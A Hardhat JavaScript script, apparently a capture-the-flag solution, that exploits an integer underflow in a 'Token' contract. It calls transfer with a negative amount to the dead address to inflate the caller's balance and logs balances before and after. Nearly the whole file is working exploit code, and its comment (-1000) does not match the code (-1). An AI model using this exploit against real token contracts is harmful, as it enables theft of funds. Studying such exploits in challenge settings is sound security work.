const { getNamedAccounts, ethers, network } = require("hardhat")
const {
    developmentChains,
    networkConfig,
    STANDARD_FEE_VALUE,
} = require("../helper-hardhat-config")

/**
 * The objective is to get more tokens than intended.
 * For this, we need to use the fact that you can transfer a negative amount of tokens.
 * 1) Transfer -1000 tokens to the "dead address": 0x000000000000000000000000000000000000dEaD
 * 2) Verify the resulting balances
 */

async function performHack() {
    const { deployer, player } = await getNamedAccounts()
    console.log("-------------------------------------")
    console.log("Retrieving contracts and hacker address...")
    let vulnerableContract, hacker
    const chainId = network.config.chainId
    const deadAddress = "0x000000000000000000000000000000000000dEaD"

    if (developmentChains.includes(network.name)) {
        hacker = deployer // 20 tokens are sent to the deployer
        vulnerableContract = await ethers.getContract("Token", hacker)
    } else {
        hacker = deployer
        vulnerableContract = await ethers.getContractAt(
            "Token",
            networkConfig[chainId]["tokenContractAddress"],
            hacker
        )
    }
    console.log("Done!")
    console.log("-------------------------------------")
    console.log("Showing initial information...")
    await showInitialInformation(vulnerableContract, hacker, deadAddress)
    console.log("-------------------------------------")
    console.log("Step 1: Starting the attack...")
    await attackStart(vulnerableContract, hacker, deadAddress)
    console.log("-------------------------------------")
}

async function showInitialInformation(vulnerableContract, hacker, deadAddress) {
    const hackerAddress = await vulnerableContract.signer.address
    const hackerBalance = await vulnerableContract.balanceOf(hacker)
    const deadAddressBalance = await vulnerableContract.balanceOf(deadAddress)
    console.log(`Hacker is ${hackerAddress}`)
    console.log(`Hacker's balance is ${hackerBalance}`)
    console.log(`Dead address balance is ${deadAddressBalance}`)
}

async function attackStart(vulnerableContract, hacker, deadAddress) {
    const tx = await vulnerableContract.transfer(deadAddress, -1)
    await tx.wait(1)
    const newHackerBalance = await vulnerableContract.balanceOf(hacker)
    const newDeadAddressBalance = await vulnerableContract.balanceOf(
        deadAddress
    )
    console.log(`New hacker's balance is ${newHackerBalance}`)
    console.log(`New dead address balance is ${newDeadAddressBalance}`)
}

performHack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
